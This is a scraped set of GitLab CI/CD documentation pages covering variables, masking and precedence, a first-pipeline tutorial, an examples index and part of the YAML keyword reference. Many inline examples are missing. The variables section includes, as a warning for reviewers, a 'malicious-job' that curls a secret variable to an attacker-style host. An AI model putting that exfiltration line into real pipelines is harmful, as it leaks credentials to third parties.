Variables saved in the .gitlab-ci.yml file are visible to all users with access to the repository, and should store only non-sensitive project configuration. For example, the URL of a database saved in a DATABASE_URL variable. Sensitive variables containing values like secrets or keys should be added in the UI.

You can define variables in:

In both cases, you cannot use these variables with global keywords.

Use the value and description keywords to define variables that are prefilled for manually-triggered pipelines.

If you don’t want default variables to be available in a job, set variables to {}:

Sensitive variables like tokens or passwords should be stored in the settings in the UI, not in the .gitlab-ci.yml file.

By default, pipelines from forked projects can’t access the CI/CD variables available to the parent project. If you run a merge request pipeline in the parent project for a merge request from a fork, all variables become available to the pipeline.

You can add CI/CD variables to a project’s settings. Projects can have a maximum of 8000 CI/CD variables.

To add or update variables in the project settings:

Alternatively, project variables can be added by using the API.

You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.

To add a group variable:

The group variables that are available in a project are listed in the project’s Settings > CI/CD > Variables section. Variables from subgroups are recursively inherited.

Alternatively, group variables can be added by using the API.

To set a group CI/CD variable to only be available for certain environments:

You can make a CI/CD variable available to all projects and groups in a GitLab instance.

To add an instance variable:

Alternatively, instance variables can be added by using the API.

Code pushed to the .gitlab-ci.yml file could compromise your variables. Variables could be accidentally exposed in a job log, or maliciously sent to a third party server.

Review all merge requests that introduce changes to the .gitlab-ci.yml file before you:

Review the .gitlab-ci.yml file of imported projects before you add files or run pipelines against them.

The following example shows malicious code in a .gitlab-ci.yml file:

To help reduce the risk of accidentally leaking secrets through scripts like in accidental-leak-job, all variables containing sensitive information should always be masked in job logs. You can also limit a variable to protected branches and tags only.

Alternatively, connect with an external secrets management provider to store and retrieve secrets.

Malicious scripts like in malicious-job must be caught during the review process. Reviewers should never trigger a pipeline when they find code like this, because malicious code can compromise both masked and protected variables.

Variable values are encrypted using aes-256-cbc and stored in the database. This data can be read and decrypted with a valid secrets file.

Masking a CI/CD variable is not a guaranteed way to prevent malicious users from accessing variable values. To ensure security of sensitive information, consider using external secrets and file type variables to prevent commands such as env or printenv from printing secret variables.

You can mask a CI/CD variable for a project, group, or instance to prevent its value from appearing in job logs. When a job outputs the value of a masked variable, the value is replaced with [MASKED] in the job log. In some cases, the [MASKED] value could be followed by x characters as well.

The value of the variable must:

If a process outputs the value in a slightly modified way, the value can’t be masked. For example, if the shell adds \ to escape special characters, the value isn’t masked:

When CI_DEBUG_SERVICES is enabled, the variable value might be revealed. For more information, see service container logging.

In addition to masking, you can also prevent the value of CI/CD variables from being revealed in the CI/CD settings page. Hiding a variable is only possible when creating a new variable, you cannot update an existing variable to be hidden.

To hide a variable, select Masked and hidden in the Visibility section when you add a new CI/CD variable in the UI. After you save the variable, the variable can be used in CI/CD pipelines, but cannot be revealed in the UI again.

You can configure a project, group, or instance CI/CD variable to be available only to pipelines that run on protected branches or protected tags.

Merged results pipelines and merge request pipelines can optionally access protected variables.

To set a variable as protected:

The variable is available for all subsequent pipelines.

All predefined CI/CD variables and variables defined in the .gitlab-ci.yml file are “variable” type ("variable_type": "env_var" in the API).

Variable type variables:

Project, group, and instance CI/CD variables are “variable” type by default, but can optionally be set as a “file” type ("variable_type": "file" in the API). File type variables:

Use file type CI/CD variables for tools that need a file as input.

For example, the AWS CLI and kubectl are both tools that use File type variables for configuration. If you are using kubectl with:

Pass KUBE_URL as a --server option, which accepts a variable, and pass $KUBE_CA_PEM as a --certificate-authority option, which accepts a path to a file:

You cannot set a CI/CD variable defined in the .gitlab-ci.yml file as a file type variable. If you have a tool that requires a file path as an input, but you want to use a variable defined in the .gitlab-ci.yml:

You can set a variable to treat values with the $ character as a reference to another variable. When the pipeline runs, the reference expands to use the value of the referenced variable.

CI/CD variables defined in the UI are not expanded by default. For CI/CD variables defined in the .gitlab-ci.yml file, control variable expansion with the variables:expand keyword.

To enable variable expansion for the variable:

Do not mask a variable value if you want to use variable expansion. If both masking and variable expansion are combined, character limitations prevent the use of the $ to reference other variables.

You can use CI/CD variables with the same name in different places, but the values can overwrite each other. The type of variable and where they are defined determines which variables take precedence.

The order of precedence for variables is (from highest to lowest):

In this example, job1 outputs The variable is 'secure' because variables defined in jobs in the .gitlab-ci.yml file have higher precedence than default variables.

Pipeline variables are variables that are specified when running a new pipeline.

In GitLab 17.7 and later, pipeline inputs are recommended over passing pipeline variables. For enhanced security, you should disable pipeline variables when using inputs.

You can specify a pipeline variable when you:

These variables have higher precedence and can override other defined variables, including predefined variables.

You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.

You can limit who can run pipelines with pipeline variables to specific user roles. When users with a lower role try to use pipeline variables, they receive an Insufficient permissions to set pipeline variables error message.

To limit the use of pipeline variables to only the Maintainer role and higher:

You can also use the projects API to set the role for the ci_pipeline_variables_minimum_override_role setting.

This restriction does not affect the use of CI/CD variables from the project or group settings. Most jobs can still use the variables keyword in the YAML configuration, but not jobs that use the trigger keyword to trigger downstream pipelines. Trigger jobs pass variables to a downstream pipelines as pipeline variables, which is also controlled by this setting.

For groups with many projects, you can disable pipeline variables in all projects that don’t currently use them. This option sets the Minimum role to use pipeline variables setting to no_one_allowed for projects that have never used pipeline variables.

To enable the pipeline variable restriction setting in projects in the group:

The migration runs in the background. You receive an email notification when the migration is complete. Project maintainers can later change the setting for their individual projects if needed.

Scripts executed in separate shell contexts do not share exports, aliases, local function definitions, or any other local shell updates.

This means that if a job fails, variables created by user-defined scripts are not exported.

When runners execute jobs defined in .gitlab-ci.yml:

Regardless of the shell the scripts are executed in, the runner output includes:

The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like export MY_VARIABLE=1.

For example, in the following .gitlab-ci.yml file, the following scripts are defined:

When the runner executes the job:

You can configure Auto DevOps to pass CI/CD variables to a running application. To make a CI/CD variable available as an environment variable in the running application’s container, prefix the variable key with K8S_SECRET_.

The Managing the Complex Configuration Data Management Monster Using GitLab video is a walkthrough of the Complex Configuration Data Monorepo working example project. It explains how multiple levels of group CI/CD variables can be combined with environment-scoped project variables for complex configuration of application builds or deployments.

The example can be copied to your own group or instance for testing. More details on what other GitLab CI patterns are demonstrated are available at the project page.

You can pass CI/CD variables to downstream pipelines. Use trigger:forward keyword to specify what type of variables to pass to the downstream pipeline.

**Examples:**

Example 1 (unknown):
```unknown
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

Example 2 (unknown):
```unknown
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

Example 3 (unknown):
```unknown
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

Example 4 (unknown):
```unknown
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

---

## Tutorial: Create and run your first GitLab CI/CD pipeline

**URL:** https://docs.gitlab.com/ci/quick_start/

**Contents:**
- Tutorial: Create and run your first GitLab CI/CD pipeline
- Prerequisites
- Steps
- Ensure you have runners available
  - If you don’t have a runner
- Create a .gitlab-ci.yml file
- View the status of your pipeline and jobs
- .gitlab-ci.yml tips
- Related topics

This tutorial shows you how to configure and run your first CI/CD pipeline in GitLab.

If you are already familiar with basic CI/CD concepts, you can learn about common keywords in Tutorial: Create a complex pipeline.

Before you start, make sure you have:

If you don’t have a project, you can create a public project for free on https://gitlab.com.

To create and run your first pipeline:

Ensure you have runners available to run your jobs.

If you’re using GitLab.com, you can skip this step. GitLab.com provides instance runners for you.

Create a .gitlab-ci.yml file at the root of your repository. This file is where you define the CI/CD jobs.

When you commit the file to your repository, the runner runs your jobs. The job results are displayed in a pipeline.

In GitLab, runners are agents that run your CI/CD jobs.

If you’re using GitLab.com, you can skip this step. GitLab.com provides instance runners for you.

To view available runners:

As long as you have at least one runner that’s active, with a green circle next to it, you have a runner available to process your jobs.

If you don’t have access to these settings, contact your GitLab administrator.

If you don’t have a runner:

When your CI/CD jobs run, in a later step, they will run on your local machine.

Now create a .gitlab-ci.yml file. It is a YAML file where you specify instructions for GitLab CI/CD.

In this file, you define:

To create a .gitlab-ci.yml file in your project:

On the left sidebar, select Search or go to and find your project.

Select Code > Repository.

Above the file list, select the branch you want to commit to. If you’re not sure, leave master or main. Then select the plus icon ( plus ) and New file:

For the Filename, type .gitlab-ci.yml and in the larger window, paste this sample code:

This example shows four jobs: build-job, test-job1, test-job2, and deploy-prod. The comments listed in the echo commands are displayed in the UI when you view the jobs. The values for the predefined variables $GITLAB_USER_LOGIN and $CI_COMMIT_BRANCH are populated when the jobs run.

Select Commit changes.

The pipeline starts and runs the jobs you defined in the .gitlab-ci.yml file.

Now take a look at your pipeline and the jobs within.

Go to Build > Pipelines. A pipeline with three stages should be displayed:

View a visual representation of your pipeline by selecting the pipeline ID:

View details of a job by selecting the job name. For example, deploy-prod:

You have successfully created your first CI/CD pipeline in GitLab. Congratulations!

Now you can get started customizing your .gitlab-ci.yml and defining more advanced jobs.

Here are some tips to get started working with the .gitlab-ci.yml file.

For the complete .gitlab-ci.yml syntax, see the full CI/CD YAML syntax reference.

**Examples:**

Example 1 (unknown):
```unknown
build-job:
  stage: build
  script:
    - echo "Hello, $GITLAB_USER_LOGIN!"

test-job1:
  stage: test
  script:
    - echo "This job tests something"

test-job2:
  stage: test
  script:
    - echo "This job tests something, but takes more time than test-job1."
    - echo "After the echo commands complete, it runs the sleep command for 20 seconds"
    - echo "which simulates a test that runs 20 seconds longer than test-job1"
    - sleep 20

deploy-prod:
  stage: deploy
  script:
    - echo "This job deploys something from the $CI_COMMIT_BRANCH branch."
  environment: production
```

---

## GitLab CI/CD examples

**URL:** https://docs.gitlab.com/ci/examples/

**Contents:**
- GitLab CI/CD examples
- CI/CD examples
  - Contributed examples
- CI/CD templates
  - Adding templates to your GitLab installation
- Other resources
  - CI/CD in the cloud
  - Customer stories
  - Getting started
  - Implementing GitLab CI/CD

This page contains links to a variety of examples that can help you understand how to implement GitLab CI/CD for your specific use case.

Examples are available in several forms. As a collection of:

The following table lists examples with step-by-step tutorials that are contained in this section:

You can help people that use your favorite programming language by submitting a link to a guide for that language. These contributed guides are hosted externally or in separate example projects:

Get started with GitLab CI/CD and your favorite programming language or framework by using a .gitlab-ci.yml template.

When you create a .gitlab-ci.yml file in the UI, you can choose one of these templates:

If a programming language or framework template is not in this list, you can contribute one. To create a template, submit a merge request to the templates list.

You can add custom examples and templates to your instance. Your GitLab administrator can designate an instance template repository that contains examples and templates specific to your organization.

This section provides further resources to help you get familiar with various uses of GitLab CI/CD. Older articles and videos may not reflect the state of the latest GitLab release.

For examples of setting up GitLab CI/CD for cloud-based environments, see:

See also the following video overviews:

For some customer experiences with GitLab CI/CD, see:

For some examples to help get you started, see:

For examples of others who have implemented GitLab CI/CD, see:

Examples of migration to GitLab CI/CD from other tools:

To see how you can integrate GitLab CI/CD with third-party systems, see:

For help with using GitLab CI/CD for mobile application development, see:

---

## CI/CD YAML syntax reference

**URL:** https://docs.gitlab.com/ci/yaml/

**Contents:**
- CI/CD YAML syntax reference
- Keywords
- Global keywords
  - default
  - include
    - include:component
    - include:local
    - include:project
    - include:remote
    - include:template

This document lists the configuration options for the GitLab .gitlab-ci.yml file. This file is where you define the CI/CD jobs that make up your pipeline.

When you are editing your .gitlab-ci.yml file, you can validate it with the CI Lint tool.

Use CI/CD expressions for more dynamic pipeline configuration options.

A GitLab CI/CD pipeline configuration includes:

Global keywords that configure pipeline behavior:

Jobs configured with job keywords:

Deprecated keywords that are no longer recommended for use.

Some keywords are not defined in a job. These keywords control pipeline behavior or import additional pipeline configuration.

You can set global defaults for some keywords. Each default keyword is copied to every job that doesn’t already have it defined. If the job already has a keyword defined, that default is not used.

Keyword type: Global keyword.

Supported values: These keywords can have custom defaults:

Use include to include external YAML files in your CI/CD configuration. You can split one long .gitlab-ci.yml file into multiple files to increase readability, or reduce duplication of the same configuration in multiple places.

You can also store template files in a central repository and include them in projects.

The include files are:

The time limit to resolve all files is 30 seconds.

Keyword type: Global keyword.

Supported values: The include subkeys:

Use include:component to add a CI/CD component to the pipeline configuration.

Keyword type: Global keyword.

Supported values: The full address of the CI/CD component, formatted as <fully-qualified-domain-name>/<project-path>/<component-name>@<specific-version>.

Example of include:component:

Use include:local to include a file that is in the same repository and branch as the configuration file containing the include keyword. Use include:local instead of symbolic links.

Keyword type: Global keyword.

A full path relative to the root directory (/):

Example of include:local:

You can also use shorter syntax to define the path:

To include files from another private project on the same GitLab instance, use include:project and include:file.

Keyword type: Global keyword.

Example of include:project:

You can also specify a ref:

Use include:remote with a full URL to include a file from a different location.

Keyword type: Global keyword.

A public URL accessible by an HTTP/HTTPS GET request:

Example of include:remote:

Use include:template to include .gitlab-ci.yml templates.

Keyword type: Global keyword.

Example of include:template:

Multiple include:template files:

Use include:inputs to set the values for input parameters when the included configuration uses spec:inputs and is added to the pipeline.

Keyword type: Global keyword.

Supported values: A string, numeric value, or boolean.

Example of include:inputs:

You can use rules with include to conditionally include other configuration files.

Keyword type: Global keyword.

Supported values: These rules subkeys:

Some CI/CD variables are supported.

Example of include:rules:

In this example, if the INCLUDE_BUILDS variable is:

Use integrity with include:remote to specifiy a SHA256 hash of the included remote file. If integrity does not match the actual content, the remote file is not processed and the pipeline fails.

Keyword type: Global keyword.

Supported values: Base64-encoded SHA256 hash of the included content.

Example of include:integrity:

Use stages to define stages that contain groups of jobs. Use stage in a job to configure the job to run in a specific stage.

If stages is not defined in the .gitlab-ci.yml file, the default pipeline stages are:

The order of the items in stages defines the execution order for jobs:

If a pipeline contains only jobs in the .pre or .post stages, it does not run. There must be at least one other job in a different stage.

Keyword type: Global keyword.

If any job fails, the pipeline is marked as failed and jobs in later stages do not start. Jobs in the current stage are not stopped and continue to run.

Use workflow to control pipeline behavior.

You can use some predefined CI/CD variables in workflow configuration, but not variables that are only defined when jobs start.

Use workflow:auto_cancel:on_new_commit to configure the behavior of the auto-cancel redundant pipelines feature.

Example of workflow:auto_cancel:on_new_commit:

Use workflow:auto_cancel:on_job_failure to configure which jobs should be canceled as soon as one job fails.

Example of workflow:auto_cancel:on_job_failure:

In this example, if job2 fails, job1 is canceled if it is still running and job3 does not start.

You can use name in workflow: to define a name for pipelines.

All pipelines are assigned the defined name. Any leading or trailing spaces in the name are removed.

Examples of workflow:name:

A simple pipeline name with a predefined variable:

A configuration with different pipeline names depending on the pipeline conditions:

The rules keyword in workflow is similar to rules defined in jobs, but controls whether or not a whole pipeline is created.

When no rules evaluate to true, the pipeline does not run.

Supported values: You can use some of the same keywords as job-level rules:

Example of workflow:rules:

In this example, pipelines run if the commit title (first line of the commit message) does not end with -draft and the pipeline is for either:

You can use variables in workflow:rules to define variables for specific pipeline conditions.

When the condition matches, the variable is created and can be used by all jobs in the pipeline. If the variable is already defined at the top level as a default variable, the workflow variable takes precedence and overrides the default variable.

Keyword type: Global keyword.

Supported values: Variable name and value pairs:

Example of workflow:rules:variables:

When the branch is the default branch:

When the branch is feature:

When the branch is something else:

Use workflow:rules:auto_cancel to configure the behavior of the workflow:auto_cancel:on_new_commit or the workflow:auto_cancel:on_job_failure features.

Example of workflow:rules:auto_cancel:

In this example, workflow:auto_cancel:on_new_commit is set to interruptible and workflow:auto_cancel:on_job_failure is set to all for all jobs by default. But if a pipeline runs for a protected branch, the rule overrides the default with on_new_commit: none and on_job_failure: none. For example, if a pipeline is running for:

Some keywords must be defined in a header section of a YAML configuration file. The header must be at the top of the file, separated from the rest of the configuration with ---.

Add a spec section to the header of a YAML file to configure the behavior of a pipeline when a configuration is added to the pipeline with the include keyword.

Specs must be declared at the top of a configuration file, in a header section separated from the rest of the configuration with ---.

You can use spec:inputs to define inputs for the CI/CD configuration.

Use the interpolation format $[[ inputs.input-id ]] to reference the values outside of the header section. Inputs are evaluated and interpolated when the configuration is fetched during pipeline creation. When using inputs, interpolation completes before the configuration is merged with the contents of the .gitlab-ci.yml file.

Keyword type: Header keyword. spec must be declared at the top of the configuration file, in a header section.

Supported values: A hash of strings representing the expected inputs.

Example of spec:inputs:

Inputs are mandatory when included, unless you set a default value with spec:inputs:default.

Use default: '' to have no default value.

Keyword type: Header keyword. spec must be declared at the top of the configuration file, in a header section.

Supported values: A string representing the default value, or ''.

Example of spec:inputs:default:

Use description to give a description to a specific input. The description does not affect the behavior of the input and is only used to help users of the file understand the input.

Keyword type: Header keyword. spec must be declared at the top of the configuration file, in a header section.

Supported values: A string representing the description.

Example of spec:inputs:description:

Inputs can use options to specify a list of allowed values for an input. The limit is 50 options per input.

Keyword type: Header keyword. spec must be declared at the top of the configuration file, in a header section.

Supported values: An array of input options.

Example of spec:inputs:options:

Use spec:inputs:regex to specify a regular expression that the input must match.

Keyword type: Header keyword. spec must be declared at the top of the configuration file, in a header section.

Supported values: Must be a regular expression.

Example of spec:inputs:regex:

In this example, inputs of v1.0 or v1.2.3 match the regular expression and pass validation. An input of v1.A.B does not match the regular expression and fails validation.

By default, inputs expect strings. Use spec:inputs:type to set a different required type for inputs.

Keyword type: Header keyword. spec must be declared at the top of the configuration file, in a header section.

Supported values: Can be one of:

Example of spec:inputs:type:

The following topics explain how to use keywords to configure CI/CD pipelines.

Use after_script to define an array of commands to run last, after a job’s before_script and script sections complete. after_script commands also run when:

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Supported values: An array including:

CI/CD variables are supported.

Example of after_script:

Scripts you specify in after_script execute in a new shell, separate from any before_script or script commands. As a result, they:

Execution timing and file inclusion:

after_script commands execute before cache and artifact upload operations.

In the following example, the only files that are not included are those created or modified after the artifact or cache upload stages:

For more information, see job execution flow.

Use allow_failure to determine whether a pipeline should continue running when a job fails.

When jobs are allowed to fail (allow_failure: true) an orange warning ( status_warning ) indicates that a job failed. However, the pipeline is successful and the associated commit is marked as passed with no warnings.

This same warning is displayed when:

The default value for allow_failure is:

Keyword type: Job keyword. You can use it only as part of a job.

Example of allow_failure:

In this example, job1 and job2 run in parallel:

Use allow_failure:exit_codes to control when a job should be allowed to fail. The job is allow_failure: true for any of the listed exit codes, and allow_failure false for any other exit code.

Keyword type: Job keyword. You can use it only as part of a job.

Example of allow_failure:

Use artifacts to specify which files to save as job artifacts. Job artifacts are a list of files and directories that are attached to the job when it succeeds, fails, or always.

The artifacts are sent to GitLab after the job finishes. They are available for download in the GitLab UI if the size is smaller than the maximum artifact size.

By default, jobs in later stages automatically download all the artifacts created by jobs in earlier stages. You can control artifact download behavior in jobs with dependencies.

When using the needs keyword, jobs can only download artifacts from the jobs defined in the needs configuration.

Job artifacts are only collected for successful jobs by default, and artifacts are restored after caches.

Read more about artifacts.

Paths are relative to the project directory ($CI_PROJECT_DIR) and can’t directly link outside it.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

CI/CD variables are supported.

Example of artifacts:paths:

This example creates an artifact with .config and all the files in the binaries directory.

Use artifacts:exclude to prevent files from being added to an artifacts archive.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:exclude:

This example stores all files in binaries/, but not *.o files located in subdirectories of binaries/.

Use expire_in to specify how long job artifacts are stored before they expire and are deleted. The expire_in setting does not affect:

After their expiry, artifacts are deleted hourly by default (using a cron job), and are not accessible anymore.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Supported values: The expiry time. If no unit is provided, the time is in seconds. Valid values include:

Example of artifacts:expire_in:

Use the artifacts:expose_as keyword to expose artifacts in the merge request UI.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:expose_as:

Use the artifacts:name keyword to define the name of the created artifacts archive. You can specify a unique name for every archive.

If not defined, the default name is artifacts, which becomes artifacts.zip when downloaded.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:name:

To create an archive with a name of the current job:

artifacts:public is now superseded by artifacts:access which has more options.

Use artifacts:public to determine whether the job artifacts should be publicly available.

When artifacts:public is true (default), the artifacts in public pipelines are available for download by anonymous, guest, and reporter users.

To deny read access to artifacts in public pipelines for anonymous, guest, and reporter users, set artifacts:public to false:

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:public:

Use artifacts:access to determine who can access the job artifacts from the GitLab UI or API. This option does not prevent you from forwarding artifacts to downstream pipelines.

You cannot use artifacts:public and artifacts:access in the same job.

Keyword type: Job keyword. You can use it only as part of a job.

Example of artifacts:access:

Use artifacts:reports to collect artifacts generated by included templates in jobs.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:reports:

Use artifacts:untracked to add all Git untracked files as artifacts (along with the paths defined in artifacts:paths). artifacts:untracked ignores configuration in the repository’s .gitignore, so matching artifacts in .gitignore are included.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:untracked:

Save all Git untracked files:

Use artifacts:when to upload artifacts on job failure or despite the failure.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of artifacts:when:

Use before_script to define an array of commands that should run before each job’s script commands, but after artifacts are restored.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Supported values: An array including:

CI/CD variables are supported.

Example of before_script:

Use cache to specify a list of files and directories to cache between jobs. You can only use paths that are in the local working copy.

You can disable caching for specific jobs, for example to override:

For more information about caches, see Caching in GitLab CI/CD.

Using cache at the top level, but not in the default section, is deprecated.

Use the cache:paths keyword to choose which files or directories to cache.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

CI/CD variables are supported.

Example of cache:paths:

Cache all files in binaries that end in .apk and the .config file:

Use the cache:key keyword to give each cache a unique identifying key. All jobs that use the same cache key use the same cache, including in different pipelines.

If not set, the default key is default. All jobs with the cache keyword but no cache:key share the default cache.

Must be used with cache: paths, or nothing is cached.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:key:

If you use Windows Batch to run your shell scripts you must replace $ with %. For example: key: %CI_COMMIT_REF_SLUG%

The cache:key value can’t contain:

The cache is shared between jobs, so if you’re using different paths for different jobs, you should also set a different cache:key. Otherwise cache content can be overwritten.

Use cache:key:files to generate a new cache key when the content of the specified files change. If the content remains unchanged, the cache key remains consistent across branches and pipelines. You can reuse caches and rebuild them less often, which speeds up subsequent pipeline runs.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

CI/CD variables are not supported.

Example of cache:key:files:

This example creates a cache for Ruby and Node.js dependencies. The cache is tied to the current versions of the Gemfile.lock and package.json files. When one of these files changes, a new cache key is computed and a new cache is created. Any future job runs that use the same Gemfile.lock and package.json with cache:key:files use the new cache, instead of rebuilding the dependencies.

Use cache:key:files_commits to generate a new cache key when the latest commit changes for the specified files. cache:key:files_commits cache keys change whenever the specified files have a new commit, even if the file content remains identical.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:key:files_commits:

This example creates a cache based on the commit history of package.json and yarn.lock. If the commit history changes for these files, a new cache key is computed and a new cache is created.

Use cache:key:prefix to combine a prefix with the SHA computed for cache:key:files.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:key:prefix:

For example, adding a prefix of $CI_JOB_NAME causes the key to look like rspec-feef9576d21ee9b6a32e30c5c79d0a0ceb68d1e5. If a branch changes Gemfile.lock, that branch has a new SHA checksum for cache:key:files. A new cache key is generated, and a new cache is created for that key. If Gemfile.lock is not found, the prefix is added to default, so the key in the example would be rspec-default.

Use untracked: true to cache all files that are untracked in your Git repository. Untracked files include files that are:

Caching untracked files can create unexpectedly large caches if the job downloads:

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:untracked:

You can combine cache:untracked with cache:paths to cache all untracked files, as well as files in the configured paths. Use cache:paths to cache any specific files, including tracked files, or files that are outside of the working directory, and use cache: untracked to also cache all untracked files. For example:

In this example, the job caches all untracked files in the repository, as well as all the files in binaries/. If there are untracked files in binaries/, they are covered by both keywords.

Use cache:unprotect to set a cache to be shared between protected and unprotected branches.

When set to true, users without access to protected branches can read and write to cache keys used by protected branches.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:unprotect:

Use cache:when to define when to save the cache, based on the status of the job.

Must be used with cache: paths, or nothing is cached.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:when:

This example stores the cache whether or not the job fails or succeeds.

To change the upload and download behavior of a cache, use the cache:policy keyword. By default, the job downloads the cache when the job starts, and uploads changes to the cache when the job ends. This caching style is the pull-push policy (default).

To set a job to only download the cache when the job starts, but never upload changes when the job finishes, use cache:policy:pull.

To set a job to only upload a cache when the job finishes, but never download the cache when the job starts, use cache:policy:push.

Use the pull policy when you have many jobs executing in parallel that use the same cache. This policy speeds up job execution and reduces load on the cache server. You can use a job with the push policy to build the cache.

Must be used with cache: paths, or nothing is cached.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:policy:

Use cache:fallback_keys to specify a list of keys to try to restore cache from if there is no cache found for the cache:key. Caches are retrieved in the order specified in the fallback_keys section.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Example of cache:fallback_keys:

Use coverage with a custom regular expression to configure how code coverage is extracted from the job output. The coverage is shown in the UI if at least one line in the job output matches the regular expression.

To extract the code coverage value from the match, GitLab uses this smaller regular expression: \d+(?:\.\d+)?.

Use the dast_configuration keyword to specify a site profile and scanner profile to be used in a CI/CD configuration. Both profiles must first have been created in the project. The job’s stage must be dast.

Keyword type: Job keyword. You can use only as part of a job.

Supported values: One each of site_profile and scanner_profile.

Example of dast_configuration:

In this example, the dast job extends the dast configuration added with the include keyword to select a specific site profile and scanner profile.

Use the dependencies keyword to define a list of specific jobs to fetch artifacts from. The specified jobs must all be in earlier stages. You can also set a job to download no artifacts at all.

When dependencies is not defined in a job, all jobs in earlier stages are considered dependent and the job fetches all artifacts from those jobs.

To fetch artifacts from a job in the same stage, you must use needs:artifacts. You should not combine dependencies with needs in the same job.

Keyword type: Job keyword. You can use it only as part of a job.

Example of dependencies:

In this example, two jobs have artifacts: build osx and build linux. When test osx is executed, the artifacts from build osx are downloaded and extracted in the context of the build. The same thing happens for test linux and artifacts from build linux.

The deploy job downloads artifacts from all previous jobs because of the stage precedence.

Use environment to define the environment that a job deploys to.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: The name of the environment the job deploys to, in one of these formats:

Example of environment:

Set a name for an environment.

Common environment names are qa, staging, and production, but you can use any name.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: The name of the environment the job deploys to, in one of these formats:

Example of environment:name:

Set a URL for an environment.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: A single URL, in one of these formats:

Example of environment:url:

Closing (stopping) environments can be achieved with the on_stop keyword defined under environment. It declares a different job that runs to close the environment.

Keyword type: Job keyword. You can use it only as part of a job.

Use the action keyword to specify how the job interacts with the environment.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: One of the following keywords:

Example of environment:action:

The auto_stop_in keyword specifies the lifetime of the environment. When an environment expires, GitLab automatically stops it.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: A period of time written in natural language. For example, these are all equivalent:

CI/CD variables are supported.

Example of environment:auto_stop_in:

When the environment for review_app is created, the environment’s lifetime is set to 1 day. Every time the review app is deployed, that lifetime is also reset to 1 day.

The auto_stop_in keyword can be used for all environment actions except stop. Some actions can be used to reset the scheduled stop time for the environment. For more information, see Access an environment for preparation or verification purposes.

Use the kubernetes keyword to configure the dashboard for Kubernetes and GitLab-managed Kubernetes resources for an environment.

Keyword type: Job keyword. You can use it only as part of a job.

Example of environment:kubernetes:

Example of environment:kubernetes when disabling managed resources:

Use the deployment_tier keyword to specify the tier of the deployment environment.

Keyword type: Job keyword. You can use it only as part of a job.

Supported values: One of the following:

Example of environment:deployment_tier:

Use CI/CD variables to dynamically name environments.

The deploy as review app job is marked as a deployment to dynamically create the review/$CI_COMMIT_REF_SLUG environment. $CI_COMMIT_REF_SLUG is a CI/CD variable set by the runner. The $CI_ENVIRONMENT_SLUG variable is based on the environment name, but suitable for inclusion in URLs. If the deploy as review app job runs in a branch named pow, this environment would be accessible with a URL like https://review-pow.example.com/.

The common use case is to create dynamic environments for branches and use them as review apps. You can see an example that uses review apps at https://gitlab.com/gitlab-examples/review-apps-nginx/.

Use extends to reuse configuration sections. It’s an alternative to YAML anchors and is a little more flexible and readable.

Keyword type: Job keyword. You can use it only as part of a job.

In this example, the rspec job uses the configuration from the .tests template job. When creating the pipeline, GitLab:

The combined configuration is equivalent to these jobs:

Use hooks to specify lists of commands to execute on the runner at certain stages of job execution, like before retrieving the Git repository.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Use hooks:pre_get_sources_script to specify a list of commands to execute on the runner before cloning the Git repository and any submodules. You can use it for example to:

Supported values: An array including:

CI/CD variables are supported.

Example of hooks:pre_get_sources_script:

This feature is in beta.

Use identity to authenticate with third party services using identity federation.

Keyword type: Job keyword. You can use it only as part of a job or in the default: section.

Supported values: An identifier. Supported providers:

Use id_tokens to create ID tokens to authenticate with third party services. All JWTs created this way support OIDC authentication. The required aud sub-keyword is used to configure the aud claim for the JWT.

Example of id_tokens:

Use image to specify a Docker image that the job runs in.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

Supported values: The name of the image, including the registry path if needed, in one of these formats:

CI/CD variables are supported.

In this example, the ruby:3.0 image is the default for all jobs in the pipeline. The rspec 2.7 job does not use the default, because it overrides the default with a job-specific image section.

The name of the Docker image that the job runs in. Similar to image used by itself.

Keyword type: Job keyword. You can use it only as part of a job or in the default section.

